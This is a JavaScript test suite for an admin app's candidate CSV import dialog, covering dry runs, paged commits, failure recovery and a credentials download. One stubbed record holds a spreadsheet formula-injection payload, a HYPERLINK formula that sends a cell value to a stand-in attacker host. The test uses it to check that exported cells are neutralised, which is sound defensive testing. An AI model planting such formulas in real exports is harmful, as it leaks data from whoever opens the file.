import { test } from 'node:test';
import assert from 'node:assert/strict';
import { JSDOM, SKIP } from './helpers/jsdom.mjs';

const flush = (ms = 40) => new Promise((resolve) => setTimeout(resolve, ms));

function setupDom() {
  const dom = new JSDOM(
    `<!doctype html><html><body>
       <aside id="sidebar"></aside><header id="topbar"></header><div id="nav-scrim"></div>
       <main id="view"></main><div id="modal-root"></div><div id="toast-root"></div>
     </body></html>`,
    { url: 'http://localhost:3000/', pretendToBeVisual: true },
  );
  const { window } = dom;
  Object.assign(globalThis, {
    window,
    document: window.document,
    location: window.location,
    localStorage: window.localStorage,
    requestAnimationFrame: window.requestAnimationFrame.bind(window),
    cancelAnimationFrame: window.cancelAnimationFrame.bind(window),
    HashChangeEvent: window.HashChangeEvent,
  });
  return dom;
}

function teardown(dom) {
  dom.window.close();
  for (const k of ['window', 'document', 'location', 'localStorage', 'requestAnimationFrame', 'cancelAnimationFrame', 'HashChangeEvent', 'fetch']) delete globalThis[k];
}

function stubFetch(sent) {
  const dryReport = (b) => ({
    headers: ['name', 'email'], create_users: b.create_users,
    total: 3, accepted: 2, rejected: 1, duplicates: 0,
    dry_run: true, imported: 0, users_created: 0, credentials: [],
    errors: [{ line: 4, errors: ['Name is required.'], name: '' }],
    duplicate_rows: [],
    preview: [
      { line: 2, name: 'Asha Sharma', target_role: 'Resident Solutions Architect (RSA)', stage: 'intake', username: 'asha.sharma' },
      { line: 3, name: 'Bilal Khan', target_role: '', stage: 'role_mapping', username: 'bilal' },
    ],
  });
  globalThis.fetch = async (url, opts = {}) => {
    const json = (body, status = 200) => ({ ok: status < 400, status, json: async () => body });
    const parse = () => { try { return JSON.parse(opts.body || '{}'); } catch { return {}; } };
    if (url.includes('/admin/candidates/import-template')) {
      return json({
        filename: 'ecod-candidates-import-template.csv', content_type: 'text/csv',
        columns: [{ key: 'Name', required: true }, { key: 'Email', required: false }],
        csv: 'Name,Email\nAsha Sharma,asha@example.com\n',
      });
    }
    if (url.includes('/admin/candidates/import')) {
      const b = parse();
      sent.push({ url, body: b });
      if (b.dry_run) return json(dryReport(b));
      return json({ ...dryReport({ ...b, create_users: b.create_users }), dry_run: false, imported: 2, users_created: 1,
        credentials: [
          { username: 'asha.sharma', name: 'Asha Sharma', password: 'Onboard-2026!' },
          // A name cell straight out of the uploaded sheet: a formula.
          { username: 'hostile', name: '=HYPERLINK("http://evil.example/"&A1,"click")', password: '-Rogue-2026!' },
        ] });
    }
    if (url.includes('/auth/me')) return json({ user: { id: 'u-admin', username: 'admin', name: 'Admin User', role: 'admin', email: '' }, candidate: null });
    if (url.includes('/admin/roles')) return json({ roles: [{ id: 'r1', name: 'Resident Solutions Architect (RSA)', active: true }] });
    if (url.includes('/admin/users')) return json({ users: [{ id: 'u-admin', username: 'admin', name: 'Admin User', role: 'admin', email: '', active: true }] });
    if (url.includes('/admin/candidates')) return json({ candidates: [] });
    return json({});
  };
}

async function renderView(viewFn) {
  localStorage.setItem('ecod.token', 'test-token');
  const { state } = await import('../public/js/app.js');
  state.meta = {
    pipelineStages: [{ key: 'intake', label: 'Candidate Intake' }, { key: 'role_mapped', label: 'Role Mapping' }],
    assessmentStatuses: [],
    questionTypes: [],
    userRoles: ['admin', 'assessor', 'candidate', 'validator', 'trainer'],
    difficulties: [],
  };
  state.user = null;
  state.candidate = null;
  const admin = await import('../public/js/views/admin.js');
  const view = document.getElementById('view');
  await admin[viewFn](view);
  return view;
}

/** Attach a fake file to the hidden input and fire change, like a real pick. */
function chooseFile(dom, selector, content, name = 'people.csv') {
  const input = document.querySelector(selector);
  const file = new dom.window.File([content], name, { type: 'text/csv' });
  Object.defineProperty(input, 'files', { value: [file] });
  input.dispatchEvent(new dom.window.Event('change'));
}

test('candidates: import validates a spreadsheet as a dry run, then commits and shows credentials once', { skip: SKIP }, async () => {
  const dom = setupDom();
  const sent = [];
  try {
    stubFetch(sent);
    const view = await renderView('candidatesView');
    view.querySelector('#import-cands').click();
    await flush(60);

    const dialog = document.querySelector('#modal-root .modal');
    assert.ok(dialog, 'import dialog opened from the candidates screen');
    assert.ok(dialog.querySelector('#ic-users').checked, 'portal users are on by default');
    const importBtn = [...dialog.querySelectorAll('.m-foot .btn')].at(-1);
    assert.equal(importBtn.disabled, true, 'cannot import before a file is checked');

    chooseFile(dom, '#ic-file', 'name,email\nAsha Sharma,asha@example.com\n');
    await flush(120);

    assert.equal(sent.length, 1, 'one request after the file is chosen');
    assert.equal(sent[0].body.dry_run, true, 'the first request is a dry run');
    assert.equal(sent[0].body.create_users, true, 'portal-user creation is included');
    assert.equal(sent[0].body.csv, 'name,email\nAsha Sharma,asha@example.com\n');
    assert.match(dialog.textContent.replace(/\s+/g, ' '), /2 ready/);
    assert.match(dialog.textContent.replace(/\s+/g, ' '), /asha\.sharma/, 'resolved username previewed');
    assert.match(dialog.textContent.replace(/\s+/g, ' '), /Name is required\./, 'rejected rows explain themselves');
    assert.equal(importBtn.disabled, false, 'import unlocks once rows are valid');

    // Toggling users off re-runs the check so the report stays honest.
    dialog.querySelector('#ic-users').checked = false;
    dialog.querySelector('#ic-users').dispatchEvent(new dom.window.Event('change'));
    await flush(120);
    assert.equal(sent[1].body.create_users, false, 'the re-check carries the new toggle');

    dialog.querySelector('#ic-users').checked = true;
    dialog.querySelector('#ic-users').dispatchEvent(new dom.window.Event('change'));
    await flush(120);

    importBtn.click();
    await flush(120);
    const commit = sent.filter((r) => !r.body.dry_run);
    assert.equal(commit.length, 1, 'the commit is one later request');
    assert.equal(commit[0].body.create_users, true);

    const text = dialog.textContent.replace(/\s+/g, ' ');
    assert.match(text, /2 imported/);
    assert.match(text, /1 user created/);
    assert.match(text, /Onboard-2026!/, 'plaintext credentials are shown once');
    assert.ok(dialog.querySelector('#ic-dl-creds'), 'credentials can be downloaded');
    assert.equal(importBtn.textContent, 'Done');

    // The credentials CSV opens in Excel on the admin's machine. A cell that
    // begins with = + - @ is a formula there, and the name column is copied
    // from the uploaded spreadsheet — so the download used to be a CSV
    // injection vector. Every such cell is neutralised with an apostrophe.
    let csv = null;
    const origCreate = globalThis.URL.createObjectURL;
    const origRevoke = globalThis.URL.revokeObjectURL;
    const origClick = dom.window.HTMLAnchorElement.prototype.click;
    globalThis.URL.createObjectURL = (blob) => { csv = blob; return 'blob:test'; };
    globalThis.URL.revokeObjectURL = () => {};
    dom.window.HTMLAnchorElement.prototype.click = function () {};
    try {
      dialog.querySelector('#ic-dl-creds').click();
      await flush(20);
      assert.ok(csv, 'a CSV blob was produced');
      const text = await csv.text();
      const lines = text.split('\n');
      assert.equal(lines[0], 'name,username,password');
      assert.equal(lines[1], '"Asha Sharma","asha.sharma","Onboard-2026!"', 'ordinary cells are untouched');
      assert.equal(lines[2], `"'=HYPERLINK(""http://evil.example/""&A1,""click"")","hostile","'-Rogue-2026!"`,
        'formula-leading cells are prefixed so the spreadsheet shows them as text');
      for (const line of lines.slice(1)) {
        for (const cell of line.split('","')) assert.doesNotMatch(cell.replace(/^"/, ''), /^[=+\-@]/, `cell ${cell} would evaluate as a formula`);
      }
    } finally {
      globalThis.URL.createObjectURL = origCreate;
      globalThis.URL.revokeObjectURL = origRevoke;
      dom.window.HTMLAnchorElement.prototype.click = origClick;
    }
  } finally { teardown(dom); }
});

test('users & access offers the same bulk import and the template link', { skip: SKIP }, async () => {
  const dom = setupDom();
  const sent = [];
  try {
    stubFetch(sent);
    const view = await renderView('usersView');
    view.querySelector('#import-users').click();
    await flush(60);

    const dialog = document.querySelector('#modal-root .modal');
    assert.ok(dialog, 'import dialog opened from the users screen');
    assert.match(dialog.querySelector('.m-head h3').textContent, /Import candidates/);

    let downloaded = null;
    const origCreate = globalThis.URL.createObjectURL;
    const origRevoke = globalThis.URL.revokeObjectURL;
    const origClick = dom.window.HTMLAnchorElement.prototype.click;
    globalThis.URL.createObjectURL = () => 'blob:test';
    globalThis.URL.revokeObjectURL = () => {};
    dom.window.HTMLAnchorElement.prototype.click = function () { downloaded = this.download; };
    try {
      dialog.querySelector('#ic-template').dispatchEvent(new dom.window.MouseEvent('click', { bubbles: true, cancelable: true }));
      await flush(120);
      assert.equal(downloaded, 'ecod-candidates-import-template.csv', 'template CSV downloads');
    } finally {
      globalThis.URL.createObjectURL = origCreate;
      globalThis.URL.revokeObjectURL = origRevoke;
      dom.window.HTMLAnchorElement.prototype.click = origClick;
    }
  } finally { teardown(dom); }
});

/**
 * The commit is paged (100 rows a request). One request for a 2000-row file
 * ran ~45 s of password hashing on the server — past a serverless function's
 * timeout, killed with the candidates written and their logins not. The
 * dialog now walks the file page by page, shows progress, accumulates the
 * credentials, and if a page fails it says exactly where it stopped and that
 * re-uploading the file continues (imported rows are reported as duplicates).
 */
function stubPagedFetch(sent, { failAtOffset = null, total = 250 } = {}) {
  globalThis.fetch = async (url, opts = {}) => {
    const json = (body, status = 200) => ({ ok: status < 400, status, json: async () => body });
    const parse = () => { try { return JSON.parse(opts.body || '{}'); } catch { return {}; } };
    if (url.includes('/admin/candidates/import-template')) return json({ filename: 't.csv', content_type: 'text/csv', columns: [], csv: 'Name\n' });
    if (url.includes('/admin/candidates/import')) {
      const b = parse();
      sent.push({ url, body: b });
      const base = { headers: ['name'], create_users: b.create_users, auto_allocate: b.auto_allocate, would_auto_allocate: 0, auto_skipped: 0, total, accepted: total, rejected: 0, duplicates: 0, errors: [], duplicate_rows: [], preview: [] };
      if (b.dry_run) return json({ ...base, dry_run: true, imported: 0, users_created: 0, credentials: [] });
      if (b.offset === failAtOffset) return json({ error: 'Gateway timeout' }, 504);
      const end = Math.min(total, b.offset + b.limit);
      const n = end - b.offset;
      return json({
        ...base, dry_run: false, imported: n, users_created: n, auto_allocated: 0, auto_allocations: [],
        credentials: Array.from({ length: n }, (_, i) => ({ username: `user${b.offset + i}`, name: `Person ${b.offset + i}`, password: `Pw-${b.offset + i}!` })),
        page: { offset: b.offset, limit: n, total, next_offset: end < total ? end : null },
      });
    }
    if (url.includes('/auth/me')) return json({ user: { id: 'u-admin', username: 'admin', name: 'Admin User', role: 'admin', email: '' }, candidate: null });
    if (url.includes('/admin/roles')) return json({ roles: [] });
    if (url.includes('/admin/users')) return json({ users: [] });
    if (url.includes('/admin/candidates')) return json({ candidates: [] });
    return json({});
  };
}

test('candidates: a large file is committed in pages of 100 with progress, credentials accumulated across pages', { skip: SKIP }, async () => {
  const dom = setupDom();
  const sent = [];
  try {
    stubPagedFetch(sent, { total: 250 });
    const view = await renderView('candidatesView');
    view.querySelector('#import-cands').click();
    await flush(60);
    const dialog = document.querySelector('#modal-root .modal');
    chooseFile(dom, '#ic-file', 'name\n' + Array.from({ length: 250 }, (_, i) => `Person ${i}`).join('\n'));
    await flush(120);
    const importBtn = [...dialog.querySelectorAll('.m-foot .btn')].at(-1);
    assert.equal(importBtn.disabled, false);

    importBtn.click();
    await flush(200);
    const commits = sent.filter((r) => !r.body.dry_run);
    assert.deepEqual(commits.map((r) => [r.body.offset, r.body.limit]), [[0, 100], [100, 100], [200, 100]], 'three pages, in order');
    assert.ok(commits.every((r) => r.body.csv && r.body.create_users === true), 'every page carries the file and the options');

    const text = dialog.textContent.replace(/\s+/g, ' ');
    assert.match(text, /250 imported/);
    assert.match(text, /250 users created/);
    assert.match(text, /user0Pw-0!/);
    assert.match(text, /user249Pw-249!/, 'credentials from the last page are shown too');
    assert.doesNotMatch(text, /stopped early/);
    assert.equal(importBtn.textContent, 'Done');
  } finally { teardown(dom); }
});

test('candidates: when a page fails the dialog keeps what was imported and says how to continue', { skip: SKIP }, async () => {
  const dom = setupDom();
  const sent = [];
  try {
    stubPagedFetch(sent, { total: 250, failAtOffset: 100 });
    const view = await renderView('candidatesView');
    view.querySelector('#import-cands').click();
    await flush(60);
    const dialog = document.querySelector('#modal-root .modal');
    chooseFile(dom, '#ic-file', 'name\n' + Array.from({ length: 250 }, (_, i) => `Person ${i}`).join('\n'));
    await flush(120);
    const importBtn = [...dialog.querySelectorAll('.m-foot .btn')].at(-1);
    importBtn.click();
    await flush(200);

    const commits = sent.filter((r) => !r.body.dry_run);
    assert.deepEqual(commits.map((r) => r.body.offset), [0, 100], 'stops at the failed page');
    const text = dialog.textContent.replace(/\s+/g, ' ');
    assert.match(text, /100 imported/);
    assert.match(text, /stopped early/);
    assert.match(text, /stopped after row 100 of 250/);
    assert.match(text, /Upload the same file again/);
    assert.match(text, /skipped as duplicates/);
    assert.match(text, /user99Pw-99!/, 'the credentials that were created are still shown');
    assert.doesNotMatch(text, /user100Pw/);
    assert.ok(dialog.querySelector('#ic-dl-creds'), 'and can be downloaded');
    assert.equal(importBtn.textContent, 'Done', 'the import happened; closing refreshes the list');
  } finally { teardown(dom); }
});
